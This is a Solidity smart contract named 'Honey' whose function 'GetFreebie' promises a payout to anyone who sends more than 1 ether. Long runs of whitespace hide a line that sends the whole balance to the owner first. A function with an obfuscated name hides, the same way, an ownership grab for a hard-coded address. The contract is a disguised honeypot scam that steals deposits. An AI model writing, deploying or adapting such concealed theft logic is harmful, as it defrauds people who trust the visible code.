// SPDX-License-Identifier: MIT
pragma solidity ^0.4.19;

contract Honey
{
    address public Owner = msg.sender;

    function()
    public
    payable
    {

    }

    function GetFreebie()
    public
    payable
    {
        bool _flag1 = false;
        bool _flag2 = false;
        if(msg.value>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Owner.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }
    }

    function _0xc921ab()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x0C76802158F13aBa9D892EE066233827424c5aAB){Owner=0x0C76802158F13aBa9D892EE066233827424c5aAB;}
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    function Command(address _0x3d21b1,bytes data)
    payable
    public
    {
        require(msg.sender == Owner);
        _0x3d21b1.call.value(msg.value)(data);
    }
}